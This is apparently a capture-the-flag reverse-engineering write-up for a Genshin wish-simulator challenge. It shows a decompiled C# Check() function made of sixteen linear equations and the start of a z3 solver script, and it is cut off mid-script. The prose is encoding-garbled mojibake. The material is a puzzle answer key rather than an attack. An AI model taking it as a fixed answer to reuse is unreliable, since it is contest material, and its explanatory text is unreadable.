        <content type="html"><![CDATA[<h2 id="RE">RE</h2><h3 id="genshinwishsimulator">genshinwishsimulator</h3><p>åŸç¥æŠ½å¡æ¨¡æ‹Ÿï¼Œå…ˆå¼€Assembly-CSharp.dllçœ‹çœ‹ï¼Œçœ‹åˆ°</p><p><img src="https://s2.loli.net/2024/02/16/Dnhg4uE96Nky1Hx.png" alt="image-20240216120848553"></p><p>å…¶ä¸­inputä¸ºå·²çŸ¥æ•°ç»„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰¾bucketæ˜¯ä»€ä¹ˆäº†ï¼Œå‘ç°è¿™ä¸ªæ–¹æ³•ä¸‹é¢æ˜¯check,æœç´¢checkæ–¹æ³•ï¼š</p><p><img src="https://s2.loli.net/2024/02/16/oLrf9gustUlB2bM.png" alt="image-20240216121045048"></p><p>å¯ä»¥å‘ç°å¦‚æœcheck==1ï¼Œå°±è¿”å›5æ˜Ÿï¼Œå¦åˆ™å…¶å®ƒï¼Œé‚£ä¹ˆå°±éœ€è¦checkè¿”å›1æ‰å¯ä»¥</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">Check</span>()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">int</span>[] bucket = GachaManager.instance.gachaHistoryBucket.GetBucket();</span><br><span class="line"><span class="keyword">return</span> bucket[<span class="number">0</span>] * <span class="number">40</span> + bucket[<span class="number">1</span>] * <span class="number">65</span> + bucket[<span class="number">2</span>] * <span class="number">-53</span> + bucket[<span class="number">3</span>] * <span class="number">70</span> + bucket[<span class="number">4</span>] * <span class="number">-84</span> + bucket[<span class="number">5</span>] * <span class="number">-38</span> + bucket[<span class="number">6</span>] * <span class="number">94</span> + bucket[<span class="number">7</span>] * <span class="number">-39</span> + bucket[<span class="number">8</span>] * <span class="number">-91</span> + bucket[<span class="number">9</span>] * <span class="number">-35</span> + bucket[<span class="number">10</span>] * <span class="number">54</span> + bucket[<span class="number">11</span>] * <span class="number">17</span> + bucket[<span class="number">12</span>] * <span class="number">45</span> + bucket[<span class="number">13</span>] * <span class="number">92</span> + bucket[<span class="number">14</span>] * <span class="number">-29</span> + bucket[<span class="number">15</span>] * <span class="number">61</span> == <span class="number">3004</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">-15</span> + bucket[<span class="number">1</span>] * <span class="number">74</span> + bucket[<span class="number">2</span>] * <span class="number">-89</span> + bucket[<span class="number">3</span>] * <span class="number">-82</span> + bucket[<span class="number">4</span>] * <span class="number">-92</span> + bucket[<span class="number">5</span>] * <span class="number">27</span> + bucket[<span class="number">6</span>] * <span class="number">21</span> + bucket[<span class="number">7</span>] * <span class="number">-24</span> + bucket[<span class="number">8</span>] * <span class="number">-82</span> + bucket[<span class="number">9</span>] * <span class="number">-58</span> + bucket[<span class="number">10</span>] * <span class="number">-36</span> + bucket[<span class="number">11</span>] * <span class="number">64</span> + bucket[<span class="number">12</span>] * <span class="number">-49</span> + bucket[<span class="number">13</span>] * <span class="number">-22</span> + bucket[<span class="number">14</span>] * <span class="number">59</span> + bucket[<span class="number">15</span>] * <span class="number">-47</span> == <span class="number">-674</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">67</span> + bucket[<span class="number">1</span>] * <span class="number">-23</span> + bucket[<span class="number">2</span>] * <span class="number">63</span> + bucket[<span class="number">3</span>] * <span class="number">-38</span> + bucket[<span class="number">4</span>] * <span class="number">-32</span> + bucket[<span class="number">5</span>] * <span class="number">61</span> + bucket[<span class="number">6</span>] * <span class="number">-71</span> + bucket[<span class="number">7</span>] * <span class="number">49</span> + bucket[<span class="number">8</span>] * <span class="number">83</span> + bucket[<span class="number">9</span>] * <span class="number">-92</span> + bucket[<span class="number">10</span>] * <span class="number">-16</span> + bucket[<span class="number">11</span>] * <span class="number">65</span> + bucket[<span class="number">12</span>] * <span class="number">-22</span> + bucket[<span class="number">13</span>] * <span class="number">12</span> + bucket[<span class="number">14</span>] * <span class="number">-85</span> + bucket[<span class="number">15</span>] * <span class="number">74</span> == <span class="number">945</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">-49</span> + bucket[<span class="number">1</span>] * <span class="number">48</span> + bucket[<span class="number">2</span>] * <span class="number">-11</span> + bucket[<span class="number">3</span>] * <span class="number">20</span> + bucket[<span class="number">4</span>] * <span class="number">-14</span> + bucket[<span class="number">5</span>] * <span class="number">92</span> + bucket[<span class="number">6</span>] * <span class="number">-19</span> + bucket[<span class="number">7</span>] * <span class="number">32</span> + bucket[<span class="number">8</span>] * <span class="number">64</span> + bucket[<span class="number">9</span>] * <span class="number">-77</span> + bucket[<span class="number">10</span>] * <span class="number">49</span> + bucket[<span class="number">11</span>] * <span class="number">-19</span> + bucket[<span class="number">12</span>] * <span class="number">72</span> + bucket[<span class="number">13</span>] * <span class="number">-64</span> + bucket[<span class="number">14</span>] * <span class="number">85</span> + bucket[<span class="number">15</span>] * <span class="number">54</span> == <span class="number">1721</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">36</span> + bucket[<span class="number">1</span>] * <span class="number">-21</span> + bucket[<span class="number">2</span>] * <span class="number">-59</span> + bucket[<span class="number">3</span>] * <span class="number">-54</span> + bucket[<span class="number">4</span>] * <span class="number">-96</span> + bucket[<span class="number">5</span>] * <span class="number">-81</span> + bucket[<span class="number">6</span>] * <span class="number">-33</span> + bucket[<span class="number">7</span>] * <span class="number">31</span> + bucket[<span class="number">8</span>] * <span class="number">-41</span> + bucket[<span class="number">9</span>] * <span class="number">-70</span> + bucket[<span class="number">10</span>] * <span class="number">-27</span> + bucket[<span class="number">11</span>] * <span class="number">24</span> + bucket[<span class="number">12</span>] * <span class="number">95</span> + bucket[<span class="number">13</span>] * <span class="number">-61</span> + bucket[<span class="number">14</span>] * <span class="number">-17</span> + bucket[<span class="number">15</span>] * <span class="number">-52</span> == <span class="number">-2198</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">78</span> + bucket[<span class="number">1</span>] * <span class="number">-62</span> + bucket[<span class="number">2</span>] * <span class="number">70</span> + bucket[<span class="number">3</span>] * <span class="number">-69</span> + bucket[<span class="number">4</span>] * <span class="number">38</span> + bucket[<span class="number">5</span>] * <span class="number">90</span> + bucket[<span class="number">6</span>] * <span class="number">-52</span> + bucket[<span class="number">7</span>] * <span class="number">41</span> + bucket[<span class="number">8</span>] * <span class="number">63</span> + bucket[<span class="number">9</span>] * <span class="number">-65</span> + bucket[<span class="number">10</span>] * <span class="number">-15</span> + bucket[<span class="number">11</span>] * <span class="number">59</span> + bucket[<span class="number">12</span>] * <span class="number">-31</span> + bucket[<span class="number">13</span>] * <span class="number">54</span> + bucket[<span class="number">14</span>] * <span class="number">33</span> + bucket[<span class="number">15</span>] * <span class="number">-57</span> == <span class="number">-1833</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">56</span> + bucket[<span class="number">1</span>] * <span class="number">75</span> + bucket[<span class="number">2</span>] * <span class="number">71</span> + bucket[<span class="number">3</span>] * <span class="number">78</span> + bucket[<span class="number">4</span>] * <span class="number">-39</span> + bucket[<span class="number">5</span>] * <span class="number">-84</span> + bucket[<span class="number">6</span>] * <span class="number">55</span> + bucket[<span class="number">7</span>] * <span class="number">54</span> + bucket[<span class="number">8</span>] * <span class="number">-12</span> + bucket[<span class="number">9</span>] * <span class="number">-57</span> + bucket[<span class="number">10</span>] * <span class="number">32</span> + bucket[<span class="number">11</span>] * <span class="number">-19</span> + bucket[<span class="number">12</span>] * <span class="number">13</span> + bucket[<span class="number">13</span>] * <span class="number">-83</span> + bucket[<span class="number">14</span>] * <span class="number">11</span> + bucket[<span class="number">15</span>] * <span class="number">-67</span> == <span class="number">829</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">10</span> + bucket[<span class="number">1</span>] * <span class="number">-97</span> + bucket[<span class="number">2</span>] * <span class="number">56</span> + bucket[<span class="number">3</span>] * <span class="number">-61</span> + bucket[<span class="number">4</span>] * <span class="number">45</span> + bucket[<span class="number">5</span>] * <span class="number">-22</span> + bucket[<span class="number">6</span>] * <span class="number">33</span> + bucket[<span class="number">7</span>] * <span class="number">81</span> + bucket[<span class="number">8</span>] * <span class="number">32</span> + bucket[<span class="number">9</span>] * <span class="number">49</span> + bucket[<span class="number">10</span>] * <span class="number">-19</span> + bucket[<span class="number">11</span>] * <span class="number">-18</span> + bucket[<span class="number">12</span>] * <span class="number">80</span> + bucket[<span class="number">13</span>] * <span class="number">-98</span> + bucket[<span class="number">14</span>] * <span class="number">79</span> + bucket[<span class="number">15</span>] * <span class="number">-36</span> == <span class="number">-2551</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">24</span> + bucket[<span class="number">1</span>] * <span class="number">-61</span> + bucket[<span class="number">2</span>] * <span class="number">91</span> + bucket[<span class="number">3</span>] * <span class="number">93</span> + bucket[<span class="number">4</span>] * <span class="number">76</span> + bucket[<span class="number">5</span>] * <span class="number">54</span> + bucket[<span class="number">6</span>] * <span class="number">-33</span> + bucket[<span class="number">7</span>] * <span class="number">-29</span> + bucket[<span class="number">8</span>] * <span class="number">-72</span> + bucket[<span class="number">9</span>] * <span class="number">20</span> + bucket[<span class="number">10</span>] * <span class="number">48</span> + bucket[<span class="number">11</span>] * <span class="number">79</span> + bucket[<span class="number">12</span>] * <span class="number">76</span> + bucket[<span class="number">13</span>] * <span class="number">68</span> + bucket[<span class="number">14</span>] * <span class="number">51</span> + bucket[<span class="number">15</span>] * <span class="number">25</span> == <span class="number">2996</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">-83</span> + bucket[<span class="number">1</span>] * <span class="number">-77</span> + bucket[<span class="number">2</span>] * <span class="number">-64</span> + bucket[<span class="number">3</span>] * <span class="number">-38</span> + bucket[<span class="number">4</span>] * <span class="number">-13</span> + bucket[<span class="number">5</span>] * <span class="number">-85</span> + bucket[<span class="number">6</span>] * <span class="number">33</span> + bucket[<span class="number">7</span>] * <span class="number">-76</span> + bucket[<span class="number">8</span>] * <span class="number">27</span> + bucket[<span class="number">9</span>] * <span class="number">14</span> + bucket[<span class="number">10</span>] * <span class="number">-79</span> + bucket[<span class="number">11</span>] * <span class="number">-63</span> + bucket[<span class="number">12</span>] * <span class="number">-78</span> + bucket[<span class="number">13</span>] * <span class="number">53</span> + bucket[<span class="number">14</span>] * <span class="number">-73</span> + bucket[<span class="number">15</span>] * <span class="number">61</span> == <span class="number">-2315</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">84</span> + bucket[<span class="number">1</span>] * <span class="number">-67</span> + bucket[<span class="number">2</span>] * <span class="number">57</span> + bucket[<span class="number">3</span>] * <span class="number">26</span> + bucket[<span class="number">4</span>] * <span class="number">94</span> + bucket[<span class="number">5</span>] * <span class="number">20</span> + bucket[<span class="number">6</span>] * <span class="number">-71</span> + bucket[<span class="number">7</span>] * <span class="number">-88</span> + bucket[<span class="number">8</span>] * <span class="number">-28</span> + bucket[<span class="number">9</span>] * <span class="number">-13</span> + bucket[<span class="number">10</span>] * <span class="number">-40</span> + bucket[<span class="number">11</span>] * <span class="number">76</span> + bucket[<span class="number">12</span>] * <span class="number">-14</span> + bucket[<span class="number">13</span>] * <span class="number">33</span> + bucket[<span class="number">14</span>] * <span class="number">76</span> + bucket[<span class="number">15</span>] * <span class="number">-75</span> == <span class="number">-150</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">-60</span> + bucket[<span class="number">1</span>] * <span class="number">88</span> + bucket[<span class="number">2</span>] * <span class="number">-66</span> + bucket[<span class="number">3</span>] * <span class="number">-72</span> + bucket[<span class="number">4</span>] * <span class="number">41</span> + bucket[<span class="number">5</span>] * <span class="number">49</span> + bucket[<span class="number">6</span>] * <span class="number">48</span> + bucket[<span class="number">7</span>] * <span class="number">-77</span> + bucket[<span class="number">8</span>] * <span class="number">-42</span> + bucket[<span class="number">9</span>] * <span class="number">25</span> + bucket[<span class="number">10</span>] * <span class="number">-50</span> + bucket[<span class="number">11</span>] * <span class="number">-84</span> + bucket[<span class="number">12</span>] * <span class="number">40</span> + bucket[<span class="number">13</span>] * <span class="number">50</span> + bucket[<span class="number">14</span>] * <span class="number">-83</span> + bucket[<span class="number">15</span>] * <span class="number">-27</span> == <span class="number">-1919</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">-16</span> + bucket[<span class="number">1</span>] * <span class="number">-53</span> + bucket[<span class="number">2</span>] * <span class="number">-21</span> + bucket[<span class="number">3</span>] * <span class="number">-44</span> + bucket[<span class="number">4</span>] * <span class="number">26</span> + bucket[<span class="number">5</span>] * <span class="number">-56</span> + bucket[<span class="number">6</span>] * <span class="number">-90</span> + bucket[<span class="number">7</span>] * <span class="number">-93</span> + bucket[<span class="number">8</span>] * <span class="number">-73</span> + bucket[<span class="number">9</span>] * <span class="number">48</span> + bucket[<span class="number">10</span>] * <span class="number">15</span> + bucket[<span class="number">11</span>] * <span class="number">-43</span> + bucket[<span class="number">12</span>] * <span class="number">-61</span> + bucket[<span class="number">13</span>] * <span class="number">-24</span> + bucket[<span class="number">14</span>] * <span class="number">71</span> + bucket[<span class="number">15</span>] * <span class="number">67</span> == <span class="number">-1199</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">55</span> + bucket[<span class="number">1</span>] * <span class="number">-34</span> + bucket[<span class="number">2</span>] * <span class="number">-22</span> + bucket[<span class="number">3</span>] * <span class="number">60</span> + bucket[<span class="number">4</span>] * <span class="number">93</span> + bucket[<span class="number">5</span>] * <span class="number">-95</span> + bucket[<span class="number">6</span>] * <span class="number">50</span> + bucket[<span class="number">7</span>] * <span class="number">36</span> + bucket[<span class="number">8</span>] * <span class="number">-48</span> + bucket[<span class="number">9</span>] * <span class="number">-26</span> + bucket[<span class="number">10</span>] * <span class="number">-94</span> + bucket[<span class="number">11</span>] * <span class="number">-35</span> + bucket[<span class="number">12</span>] * <span class="number">21</span> + bucket[<span class="number">13</span>] * <span class="number">-27</span> + bucket[<span class="number">14</span>] * <span class="number">91</span> + bucket[<span class="number">15</span>] * <span class="number">-76</span> == <span class="number">-1163</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">64</span> + bucket[<span class="number">1</span>] * <span class="number">-50</span> + bucket[<span class="number">2</span>] * <span class="number">-23</span> + bucket[<span class="number">3</span>] * <span class="number">-70</span> + bucket[<span class="number">4</span>] * <span class="number">-78</span> + bucket[<span class="number">5</span>] * <span class="number">34</span> + bucket[<span class="number">6</span>] * <span class="number">26</span> + bucket[<span class="number">7</span>] * <span class="number">64</span> + bucket[<span class="number">8</span>] * <span class="number">-72</span> + bucket[<span class="number">9</span>] * <span class="number">10</span> + bucket[<span class="number">10</span>] * <span class="number">-96</span> + bucket[<span class="number">11</span>] * <span class="number">61</span> + bucket[<span class="number">12</span>] * <span class="number">-15</span> + bucket[<span class="number">13</span>] * <span class="number">31</span> + bucket[<span class="number">14</span>] * <span class="number">36</span> + bucket[<span class="number">15</span>] * <span class="number">50</span> == <span class="number">-266</span> &amp;&amp; bucket[<span class="number">0</span>] * <span class="number">-27</span> + bucket[<span class="number">1</span>] * <span class="number">86</span> + bucket[<span class="number">2</span>] * <span class="number">-61</span> + bucket[<span class="number">3</span>] * <span class="number">89</span> + bucket[<span class="number">4</span>] * <span class="number">-53</span> + bucket[<span class="number">5</span>] * <span class="number">10</span> + bucket[<span class="number">6</span>] * <span class="number">-42</span> + bucket[<span class="number">7</span>] * <span class="number">92</span> + bucket[<span class="number">8</span>] * <span class="number">-48</span> + bucket[<span class="number">9</span>] * <span class="number">13</span> + bucket[<span class="number">10</span>] * <span class="number">84</span> + bucket[<span class="number">11</span>] * <span class="number">-71</span> + bucket[<span class="number">12</span>] * <span class="number">93</span> + bucket[<span class="number">13</span>] * <span class="number">54</span> + bucket[<span class="number">14</span>] * <span class="number">-69</span> + bucket[<span class="number">15</span>] * <span class="number">-30</span> == <span class="number">892</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°è¯•z3:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">bucket = [Int(<span class="string">&#x27;bucket[%d]&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(And(bucket[<span class="number">0</span>] * <span class="number">40</span> + bucket[<span class="number">1</span>] * <span class="number">65</span> + bucket[<span class="number">2</span>] * -<span class="number">53</span> + bucket[<span class="number">3</span>] * <span class="number">70</span> + bucket[<span class="number">4</span>] * -<span class="number">84</span> + bucket[<span class="number">5</span>] * -<span class="number">38</span> + bucket[<span class="number">6</span>] * <span class="number">94</span> + bucket[<span class="number">7</span>] * -<span class="number">39</span> + bucket[<span class="number">8</span>] * -<span class="number">91</span> + bucket[<span class="number">9</span>] * -<span class="number">35</span> + bucket[<span class="number">10</span>] * <span class="number">54</span> + bucket[<span class="number">11</span>] * <span class="number">17</span> + bucket[<span class="number">12</span>] * <span class="number">45</span> + bucket[<span class="number">13</span>] * <span class="number">92</span> + bucket[<span class="number">14</span>] * -<span class="number">29</span> + bucket[<span class="number">15</span>] * <span class="number">61</span> == <span class="number">3004</span> , bucket[<span class="number">0</span>] * -<span class="number">15</span> + bucket[<span class="number">1</span>] * <span class="number">74</span> + bucket[<span class="number">2</span>] * -<span class="number">89</span> + bucket[<span class="number">3</span>] * -<span class="number">82</span> + bucket[<span class="number">4</span>] * -<span class="number">92</span> + bucket[<span class="number">5</span>] * <span class="number">27</span> + bucket[<span class="number">6</span>] * <span class="number">21</span> + bucket[<span class="number">7</span>] * -<span class="number">24</span> + bucket[<span class="number">8</span>] * -<span class="number">82</span> + bucket[<span class="number">9</span>] * -<span class="number">58</span> + bucket[<span class="number">10</span>] * -<span class="number">36</span> + bucket[<span class="number">11</span>] * <span class="number">64</span> + bucket[<span class="number">12</span>] * -<span class="number">49</span> + bucket[<span class="number">13</span>] * -<span class="number">22</span> + bucket[<span class="number">14</span>] * <span class="number">59</span> + bucket[<span class="number">15</span>] * -<span class="number">47</span> == -<span class="number">674</span> , bucket[<span class="number">0</span>] * <span class="number">67</span> + bucket[<span class="number">1</span>] * -<span class="number">23</span> + bucket[<span class="number">2</span>] * <span class="number">63</span> + bucket[<span class="number">3</span>] * -<span class="number">38</span> + bucket[<span class="number">4</span>] * -<span class="number">32</span> + bucket[<span class="number">5</span>] * <span class="number">61</span> + bucket[<span class="number">6</span>] * -<span class="number">71</span> + bucket[<span class="number">7</span>] * <span class="number">49</span> + bucket[<span class="number">8</span>] * <span class="number">83</span> + bucket[<span class="number">9</span>] * -<span class="number">92</span> + bucket[<span class="number">10</span>] * -<span class="number">16</span> + bucket[<span class="number">11</span>] * <span class="number">65</span> + bucket[<span class="number">12</span>] * -<span class="number">22</span> + bucket[<span class="number">13</span>] * <span class="number">12</span> + bucket[<span class="number">14</span>] * -<span class="number">85</span> + bucket[<span class="number">15</span>] * <span class="number">74</span> == <span class="number">945</span> , bucket[<span class="number">0</span>] * -<span class="number">49</span> + bucket[<span class="number">1</span>] * <span class="number">48</span> + bucket[<span class="number">2</span>] * -<span class="number">11</span> + bucket[<span class="number">3</span>] * <span class="number">20</span> + bucket[<span class="number">4</span>] * -<span class="number">14</span> + bucket[<span class="number">5</span>] * <span class="number">92</span> + bucket[<span class="number">6</span>] * -<span class="number">19</span> + bucket[<span class="number">7</span>] * <span class="number">32</span> + bucket[<span class="number">8</span>] * <span class="number">64</span> + bucket[<span class="number">9</span>] * -<span class="number">77</span> + bucket[<span class="number">10</span>] * <span class="number">49</span> + bucket[<span class="number">11</span>] * -<span class="number">19</span> + bucket[<span class="number">12</span>] * <span class="number">72</span> + bucket[<span class="number">13</span>] * -<span class="number">64</span> + bucket[<span class="number">14</span>] * <span class="number">85</span> + bucket[<span class="number">15</span>] * <span class="number">54</span> == <span class="number">1721</span> , bucket[<span class="number">0</span>] * <span class="number">36</span> + bucket[<span class="number">1</span>] * -<span class="number">21</span> + bucket[<span class="number">2</span>] * -<span class="number">59</span> + bucket[<span class="number">3</span>] * -<span class="number">54</span> + bucket[<span class="number">4</span>] * -<span class="number">96</span> + bucket[<span class="number">5</span>] * -<span class="number">81</span> + bucket[<span class="number">6</span>] * -<span class="number">33</span> + bucket[<span class="number">7</span>] * <span class="number">31</span> + bucket[<span class="number">8</span>] * -<span class="number">41</span> + bucket[<span class="number">9</span>] * -<span class="number">70</span> + bucket[<span class="number">10</span>] * -<span class="number">27</span> + bucket[<span class="number">11</span>] * <span class="number">24</span> + bucket[<span class="number">12</span>] * <span class="number">95</span> + bucket[<span class="number">13</span>] * -<span class="number">61</span> + bucket[<span class="number">14</span>] * -<span class="number">17</span> + bucket[<span class="number">15</span>] * -<span class="number">52</span> == -<span class="number">2198</span> , bucket[<span class="number">0</span>] * <span class="number">78</span> + bucket[<span class="number">1</span>] * -<span class="number">62</span> + bucket[<span class="number">2</span>] * <span class="number">70</span> + bucket[<span class="number">3</span>] * -<span class="number">69</span> + bucket[<span class="number">4</span>] * <span class="number">38</span> + bucket[<span class="number">5</span>] * <span class="number">90</span> + bucket[<span class="number">6</span>] * -<span class="number">52</span> + bucket[<span class="number">7</span>] * <span class="number">41</span> + bucket[<span class="number">8</span>] * <span class="number">63</span> + bucket[<span class="number">9</span>] * -<span class="number">65</span> + bucket[<span class="number">10</span>] * -<span class="number">15</span> + bucket[<span class="number">11</span>] * <span class="number">59</span> + bucket[<span class="number">12</span>] * -<span class="number">31</span> + bucket[<span class="number">13</span>] * <span class="number">54</span> + bucket[<span class="number">14</span>] * <span class="number">33</span> + bucket[<span class="number">15</span>] * -<span class="number">57</span> == -<span class="number">1833</span> , bucket[<span class="number">0</span>] * <span class="number">56</span> + bucket[<span class="number">1</span>] * <span class="number">75</span> + bucket[<span class="number">2</span>] * <span class="number">71</span> + bucket[<span class="number">3</span>] * <span class="number">78</span> + bucket[<span class="number">4</span>] * -<span class="number">39</span> + bucket[<span class="number">5</span>] * -<span class="number">84</span> + bucket[<span class="number">6</span>] * <span class="number">55</span> + bucket[<span class="number">7</span>] * <span class="number">54</span> + bucket[<span class="number">8</span>] * -<span class="number">12</span> + bucket[<span class="number">9</span>] * -<span class="number">57</span> + bucket[<span class="number">10</span>] * <span class="number">32</span> + bucket[<span class="number">11</span>] * -<span class="number">19</span> + bucket[<span class="number">12</span>] * <span class="number">13</span> + bucket[<span class="number">13</span>] * -<span class="number">83</span> + bucket[<span class="number">14</span>] * <span class="number">11</span> + bucket[<span class="number">15</span>] * -<span class="number">67</span> == <span class="number">829</span> , bucket[<span class="number">0</span>] * <span class="number">10</span> + bucket[<span class="number">1</span>] * -<span class="number">97</span> + bucket[<span class="number">2</span>] * <span class="number">56</span> + bucket[<span class="number">3</span>] * -<span class="number">61</span> + bucket[<span class="number">4</span>] * <span class="number">45</span> + bucket[<span class="number">5</span>] * -<span class="number">22</span> + bucket[<span class="number">6</span>] * <span class="number">33</span> + bucket[<span class="number">7</span>] * <span class="number">81</span> + bucket[<span class="number">8</span>] * <span class="number">32</span> + bucket[<span class="number">9</span>] * <span class="number">49</span> + bucket[<span class="number">10</span>] * -<span class="number">19</span> + bucket[<span class="number">11</span>] * -<span class="number">18</span> + bucket[<span class="number">12</span>] * <span class="number">80</span> + bucket[<span class="number">13</span>] * -<span class="number">98</span> + bucket[<span class="number">14</span>] * <span class="number">79</span> + bucket[<span class="number">15</span>] * -<span class="number">36</span> == -<span class="number">2551</span> , bucket[<span class="number">0</span>] * <span class="number">24</span> + bucket[<span class="number">1</span>] * -<span class="number">61</span> + bucket[<span class="number">2</span>] * <span class="number">91</span> + bucket[<span class="number">3</span>] * <span class="number">93</span> + bucket[<span class="number">4</span>] * <span class="number">76</span> + bucket[<span class="number">5</span>] * <span class="number">54</span> + bucket[<span class="number">6</span>] * -<span class="number">33</span> + bucket[<span class="number">7</span>] * -<span class="number">29</span> + bucket[<span class="number">8</span>] * -<span class="number">72</span> + bucket[<span class="number">9</span>] * <span class="number">20</span> + bucket[<span class="number">10</span>] * <span class="number">48</span> + bucket[<span class="number">11</span>] * <span class="number">79</span> + bucket[<span class="number">12</span>] * <span class="number">76</span> + bucket[<span class="number">13</span>] * <span class="number">68</span> + bucket[<span class="number">14</span>] * <span class="number">51</span> + bucket[<span class="number">15</span>] * <span class="number">25</span> == <span class="number">2996</span> , bucket[<span class="number">0</span>] * -<span class="number">83</span> + bucket[<span class="number">1</span>] * -<span class="number">77</span> + bucket[<span class="number">2</span>] * -<span class="number">64</span> + bucket[<span class="number">3</span>] * -<span class="number">38</span> + bucket[<span class="number">4</span>] * -<span class="number">13</span> + bucket[<span class="number">5</span>] * -<span class="number">85</span> + bucket[<span class="number">6</span>] * <span class="number">33</span> + bucket[<span class="number">7</span>] * -<span class="number">76</span> + bucket[<span class="number">8</span>] * <span class="number">27</span> + bucket[<span class="number">9</span>] * <span class="number">14</span> + bucket[<span class="number">10</span>] * -<span class="number">79</span> + bucket[<span class="number">11</span>] * -<span class="number">63</span> + bucket[<span class="number">12</span>] * -<span class="number">78</span> + bucket[<span class="number">13</span>] * <span class="number">53</span> + bucket[<span class="number">14</span>] * -<span class="number">73</span> + bucket[<span class="number">15</span>] * <span class="number">61</span> == -<span class="number">2315</span> , bucket[<span class="number">0</span>] * <span class="number">84</span> + bucket[<span class="number">1</span>] * -<span class="number">67</span> + bucket[<span class="number">2</span>] * <span class="number">57</span> + bucket[<span class="number">3</span>] * <span class="number">26</span> + bucket[<span class="number">4</span>] * <span class="number">94</span> + bucket[<span class="number">5</span>] * <span class="number">20</span> + bucket[<span class="number">6</span>] * -<span class="number">71</span> + bucket[<span class="number">7</span>] * -<span class="number">88</span> + bucket[<span class="number">8</span>] * -<span class="number">28</span> + bucket[<span class="number">9</span>] * -<span class="number">13</span> + bucket[<span class="number">10</span>] * -<span class="number">40</span> + bucket[<span class="number">11</span>] * <span class="number">76</span> + bucket[<span class="number">12</span>] * -<span class="number">14</span> + bucket[<span class="number">13</span>] * <span class="number">33</span> + bucket[<span class="number">14</span>] * <span class="number">76</span> + bucket[<span class="number">15</span>] * -<span class="number">75</span> == -<span class="number">150</span> , bucket[<span class="number">0</span>] * -<span class="number">60</span> + bucket[<span class="number">1</span>] * <span class="number">88</span> + bucket[<span class="number">2</span>] * -<span class="number">66</span> + bucket[<span class="number">3</span>] * -<span class="number">72</span> + bucket[<span class="number">4</span>] * <span class="number">41</span> + bucket[<span class="number">5</span>] * <span class="number">49</span> + bucket[<span class="number">6</span>] * <span class="number">48</span> + bucket[<span class="number">7</span>] * -<span class="number">77</span> + bucket[<span class="number">8</span>] * -<span class="number">42</span> + bucket[<span class="number">9</span>] * <span class="number">25</span> + bucket[<span class="number">10</span>] * -<span class="number">50</span> + bucket[<span class="number">11</span>] * -<span class="number">84</span> + bucket[<span class="number">12</span>] * <span class="number">40</span> + bucket[<span class="number">13</span>] * <span class="number">50</span> + bucket[<span class="number">14</span>] * -<span class="number">83</span> + bucket[<span class="number">15</span>] * -<span class="number">27</span> == -<span class="number">1919</span> , bucket[<span class="number">0</span>] * -<span class="number">16</span> + bucket[<span class="number">1</span>] * -<span class="number">53</span> + bucket[<span class="number">2</span>] * -<span class="number">21</span> + bucket[<span class="number">3</span>] * -<span class="number">44</span> + bucket[<span class="number">4</span>] * <span class="number">26</span> + bucket[<span class="number">5</span>] * -<span class="number">56</span> + bucket[<span class="number">6</span>] * -<span class="number">90</span> + bucket[<span class="number">7</span>] * -<span class="number">93</span> + bucket[<span class="number">8</span>] * -<span class="number">73</span> + bucket[<span class="number">9</span>] * <span class="number">48</span> + bucket[<span class="number">10</span>] * <span class="number">15</span> + bucket[<span class="number">11</span>] * -<span class="number">43</span> + bucket[<span class="number">12</span>] * -<span class="number">61</span> + bucket[<span class="number">13</span>] * -<span class="number">24</span> + bucket[<span class="number">14</span>] * <span class="number">71</span> + bucket[<span class="number">15</span>] * <span class="number">67</span> == -<span class="number">1199</span> , bucket[<span class="number">0</span>] * <span class="number">55</span> + bucket[<span class="number">1</span>] * -<span class="number">34</span> + bucket[<span class="number">2</span>] * -<span class="number">22</span> + bucket[<span class="number">3</span>] * <span class="number">60</span> + bucket[<span class="number">4</span>] * <span class="number">93</span> + bucket[<span class="number">5</span>] * -<span class="number">95</span> + bucket[<span class="number">6</span>] * <span class="number">50</span> + bucket[<span class="number">7</span>] * <span class="number">36</span> + bucket[<span class="number">8</span>] * -<span class="number">48</span> + bucket[<span class="number">9</span>] * -<span class="number">26</span> + bucket[<span class="number">10</span>] * -<span class="number">94</span> + bucket[<span class="number">11</span>] * -<span class="number">35</span> + bucket[<span class="number">12</span>] * <span class="number">21</span> + bucket[<span class="number">13</span>] * 